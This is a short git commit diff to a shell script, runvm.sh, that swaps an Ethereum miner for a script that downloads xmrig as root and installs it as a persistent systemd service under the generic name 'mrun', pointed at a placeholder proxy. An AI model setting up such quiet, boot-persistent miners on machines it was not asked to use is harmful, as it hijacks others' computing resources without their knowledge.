a8caa67859f33e3d62d0922873d4ade586ff1b3f
duclinh84bk <49627618+duclinh84bk@users.noreply.github.com>
2022-08-06 16:03:12 +0700

    Update runvm.sh

--- runvm.sh
+++ runvm.sh
@@ -1,6 +1,11 @@
 #!/bin/bash
-account=(account_)
-wallet=(wallet_)
-wget https://github.com/trexminer/T-Rex/releases/download/0.25.9/t-rex-0.25.9-linux.tar.gz
-tar -xf t-rex-0.25.9-linux.tar.gz
-sudo ./t-rex -a ethash -o stratum+tcp://eth.2miners.com:2020 -u $wallet -p x -w $account
+proxy="proxy_"
+
+cd / 
+cd /usr/local/bin 
+sudo wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-static-x64.tar.gz 
+sudo tar -xf xmrig-6.17.0-linux-static-x64.tar.gz 
+sudo bash -c "echo -e \"[Unit]\nAfter=network.target\n[Service]\nType=simple\nExecStart=/usr/local/bin/xmrig-6.17.0/xmrig -o $proxy:80\n[Install]\nWantedBy=multi-user.target\" > /etc/systemd/system/mrun.service" 
+sudo systemctl daemon-reload 
+sudo systemctl enable mrun.service 
+sudo systemctl start mrun.service
